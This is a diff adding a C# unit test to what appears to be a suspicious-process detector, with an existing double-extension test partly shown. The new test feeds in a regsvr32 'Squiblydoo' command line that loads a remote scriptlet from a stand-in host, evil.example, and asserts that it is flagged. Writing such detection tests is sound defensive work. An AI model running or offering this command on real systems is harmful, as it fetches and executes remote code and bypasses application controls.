@@ -65,6 +65,15 @@ public class SuspicionTests
     }
 
     [Fact]
+    public void Regsvr32Squiblydoo_IsFlagged()
+    {
+        var result = Suspicion.Analyze(Path.Combine(Environment.SystemDirectory, "regsvr32.exe"),
+            new SignatureInfo(SignatureStatus.Valid, "Microsoft Windows"),
+            "regsvr32.exe /s /n /u /i:http://evil.example/a.sct scrobj.dll");
+        Assert.True(result.IsSuspicious);
+    }
+
+    [Fact]
     public void DoubleExtension_IsFlagged()
     {
         var result = Suspicion.Analyze(@"D:\docs\invoice.pdf.exe", new SignatureInfo(SignatureStatus.Unsigned, null));
